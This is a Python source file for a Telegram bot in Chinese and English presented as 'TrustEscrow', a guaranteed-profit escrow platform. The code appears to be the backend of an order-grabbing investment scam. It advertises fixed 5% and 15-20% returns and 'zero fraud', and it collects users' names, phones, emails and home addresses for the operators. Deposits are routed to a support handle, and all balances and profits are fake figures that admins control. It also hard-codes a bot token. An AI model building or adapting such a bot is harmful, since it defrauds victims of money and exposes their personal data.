# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import random

# ===================== 核心配置 =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_IDS = [8781082053, 8256055083]
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 双语文案 =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",

        "reg_form": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID""",

        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "reg_error": "❌ 格式錯誤，請按要求一次性發送完整5項信息",

        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USDT
📌 狀態：{}

⏳ 未完成訂單：
{}
✅ 已完成訂單：
{}""",

        "grab": """🚀 搶單大廳
隨機訂單｜5%利潤
🔥 小額常見，大額稀有！""",

        "deposit": """💰 儲值 & 提現
請聯繫官方客服：
➡️ @fcff88""",

        "record": """📜 擔保記錄
{}""",

        "account_detail": """📋 賬號明細
🆔 用戶ID：{}
👤 真實姓名：{}
📞 聯絡電話：{}
📧 電子信箱：{}
🏠 居住地址：{}
👥 推薦人ID：{}
💰 當前餘額：{:.2f} USDT
📌 審核狀態：{}""",

        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",

        "grab_success": "✅ 搶單成功，請接單",
        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",
        "no_detail": "❌ 你尚未填寫入駐信息",

        "admin_verify_success": "✅ 已成功通過用戶 {} 的審核",
        "admin_assign": "✅ 派單成功",
        "admin_done": "✅ 訂單已完成，利潤已發放",
        "btn_back": "返回首頁",
        "btn_accept": "接單"
    },
    "en": {
        "home": """🏆 TrustEscrow Premium Platform
Safe · Stable · Secure

✅ 5 Years 0 Fraud
✅ 100% Safe Escrow
✅ 5% Grab Profit
✅ 15-20% Assign Profit

Support: @fcff88""",

        "reg_form": """📝 Escrow Registration
Fill in your real info:
1. Full Name
2. Phone Number
3. Email
4. Address
5. Referrer ID""",

        "reg_success": "✅ Application Submitted, Waiting for Review",
        "reg_error": "❌ Format Error, Please send all 5 items correctly",

        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}

⏳ Pending Orders:
{}
✅ Completed Orders:
{}""",

        "grab": """🚀 Grab Order
Profit 5%""",

        "deposit": """💰 Deposit & Withdraw
Contact support: @fcff88""",

        "record": """📜 Escrow Record
{}""",

        "account_detail": """📋 Account Detail
🆔 ID: {}
👤 Full Name: {}
📞 Phone: {}
📧 Email: {}
🏠 Address: {}
👥 Referrer ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}""",

        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",

        "grab_success": "✅ Order Grabbed",
        "accept_success": "✅ Accepted",
        "not_enough": "❌ Not enough USDT",
        "not_verified": "❌ Not verified",
        "no_detail": "❌ You have not submitted registration",

        "admin_verify_success": "✅ Successfully verified user {}",
        "admin_assign": "✅ Order Assigned",
        "admin_done": "✅ Order Completed",
        "btn_back": "Home",
        "btn_accept": "Accept"
    }
}

# ===================== 数据存储 =====================
user_lang = {}
user_balance = {}
user_verify = {}  # 0=未申请 1=审核中 2=已通过
user_info = {}
orders = {}
order_id = 1
last_msg = {}
user_applying = {}  # 标记申请流程

# ===================== 菜单生成 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("賬號明細" if lang == "zh" else "Account Detail", callback_data="detail"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
    return m

def accept_btn(oid, user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
    return m

# ===================== 通知管理员 =====================
def notify_admins(text):
    for admin in ADMIN_IDS:
        try:
            bot.send_message(admin, text)
        except Exception as e:
            print(f"通知管理员失败: {e}")
            continue

# ===================== /start 启动 =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})
    user_applying[u] = False
    lang = user_lang[u]
    sent = bot.send_message(u, TEXT[lang]["home"], reply_markup=main_menu(u))
    last_msg[u] = sent.message_id

# ===================== 按钮回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = c.message.message_id
    cid = c.message.chat.id
    last_msg[u] = mid

    try:
        if c.data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "reg":
            if user_verify.get(u, 0) != 0:
                bot.answer_callback_query(c.id, TEXT["zh"]["reg_success"] if user_verify[u] == 1 else "❌ 已通過審核", show_alert=True)
                return
            user_applying[u] = True
            bot.edit_message_text(t["reg_form"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "detail":
            info = user_info.get(u, {})
            if not info:
                bot.edit_message_text(t["no_detail"], cid, mid, reply_markup=back_menu(u))
                return
            name = info.get("name", "-")
            phone = info.get("phone", "-")
            email = info.get("email", "-")
            addr = info.get("addr", "-")
            ref = info.get("ref", "-")
            bal = user_balance.get(u, 0)
            v = user_verify.get(u, 0)
            status = "未申請" if v == 0 else "審核中" if v == 1 else "已通過" if lang == "zh" else \
                "Not Applied" if v == 0 else "Pending" if v == 1 else "Verified"
            text = t["account_detail"].format(u, name, phone, email, addr, ref, bal, status)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            v = user_verify.get(u, 0)
            status = "未申請" if v == 0 else "審核中" if v == 1 else "已通過" if lang == "zh" else \
                "Not Applied" if v == 0 else "Pending" if v == 1 else "Verified"
            p_text = "\n".join(pending) if pending else "無"
            c_text = "\n".join(completed) if completed else "無"
            text = t["profile"].format(u, user_balance.get(u, 0), status, p_text, c_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u, 0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            global order_id
            amt = round(random.uniform(10, 50), 2)
            if random.random() < 0.15:
                amt = round(random.uniform(50, 100), 2)
            oid = order_id
            order_id += 1
            orders[oid] = {"user": u, "amount": amt, "type": "grab", "status": 0}
            bot.edit_message_text(t["grab_success"], cid, mid, reply_markup=accept_btn(oid, u))

        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "❌ 無效訂單", show_alert=True)
                return
            if user_balance.get(u, 0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(t["accept_success"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "deposit":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
            text = t["record"].format("\n".join(lines) if lines else "無記錄")
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 用户消息处理（入驻申请） =====================
@bot.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS)
def user_input(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]

    user_applying.setdefault(u, False)
    if not user_applying[u]:
        return

    pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+)"
    match = re.search(pattern, txt, re.DOTALL)

    if match:
        name = match.group(1).strip()
        phone = match.group(2).strip()
        email = match.group(3).strip()
        addr = match.group(4).strip()
        ref = match.group(5).strip()

        user_info[u] = {
            "name": name,
            "phone": phone,
            "email": email,
            "addr": addr,
            "ref": ref
        }
        user_verify[u] = 1
        user_applying[u] = False

        notify_admins(f"""📥 新入駐申請
用戶ID：{u}
姓名：{name}
電話：{phone}
郵箱：{email}
地址：{addr}
推薦人：{ref}""")

        mid = last_msg.get(u, None)
        if mid:
            bot.edit_message_text(t["reg_success"], msg.chat.id, mid, reply_markup=main_menu(u))
        else:
            sent = bot.send_message(msg.chat.id, t["reg_success"], reply_markup=main_menu(u))
            last_msg[u] = sent.message_id
    else:
        mid = last_msg.get(u, None)
        if mid:
            bot.edit_message_text(t["reg_error"], msg.chat.id, mid, reply_markup=back_menu(u))
        else:
            sent = bot.send_message(msg.chat.id, t["reg_error"], reply_markup=back_menu(u))
            last_msg[u] = sent.message_id

# ===================== 管理员命令（核心修复！） =====================
@bot.message_handler(func=lambda m: True)
def admin_cmd(msg):
    u = msg.from_user.id
    # 只处理管理员消息
    if u not in ADMIN_IDS:
        return

    txt = msg.text.strip()
    arr = txt.split()
    t = TEXT["zh"]

    try:
        # 支持3种中文审核指令，全覆盖
        if len(arr) >= 2:
            # 匹配所有中文审核写法
            if arr[0] in ["审核通过", "通过审核", "通过"]:
                target = int(arr[1])
                # 检查用户是否存在
                if target not in user_verify:
                    user_verify[target] = 0
                # 标记为已通过
                user_verify[target] = 2
                # 回复管理员
                bot.send_message(u, t["admin_verify_success"].format(target))
                # 通知用户
                mid_target = last_msg.get(target, None)
                if mid_target:
                    bot.edit_message_text("✅ 你的入駐申請已通過審核！", target, mid_target, reply_markup=main_menu(target))
                else:
                    sent = bot.send_message(target, "✅ 你的入駐申請已通過審核！", reply_markup=main_menu(target))
                    last_msg[target] = sent.message_id
                return

        # 派单指令
        if arr[0] == "派单" and len(arr) == 3:
            target = int(arr[1])
            amt = float(arr[2])
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
            bot.send_message(u, t["admin_assign"])
            mid_target = last_msg.get(target, None)
            if mid_target:
                bot.edit_message_text(f"📥 新派單 #{oid} {amt} USDT", target, mid_target, reply_markup=accept_btn(oid, target))
            else:
                sent = bot.send_message(target, f"📥 新派單 #{oid} {amt} USDT", reply_markup=accept_btn(oid, target))
                last_msg[target] = sent.message_id
            return

        # 完成订单指令
        if arr[0] == "完成" and len(arr) == 2:
            oid = int(arr[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            o["status"] = 2
            if o["type"] == "assign":
                profit = o["amount"] * random.uniform(0.15, 0.20)
            else:
                profit = o["amount"] * 0.05
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, t["admin_done"])
            bot.send_message(o["user"], f"✅ 訂單 #{oid} 完成！\n本金：{o['amount']} USDT\n利潤：{round(profit, 2)} USDT\n總到賬：{round(o['amount'] + profit, 2)} USDT")
            return

        # 指令不匹配，提示
        bot.send_message(u, "❌ 指令格式錯誤\n可用指令：\n审核通过 用户ID\n派单 用户ID 金额\n完成 订单ID")

    except Exception as e:
        bot.send_message(u, f"❌ 指令執行失敗：{str(e)}")

# ===================== 启动机器人 =====================
if __name__ == "__main__":
    print("✅ 機器人啟動成功 (最終穩定版)")
    bot.infinity_polling()
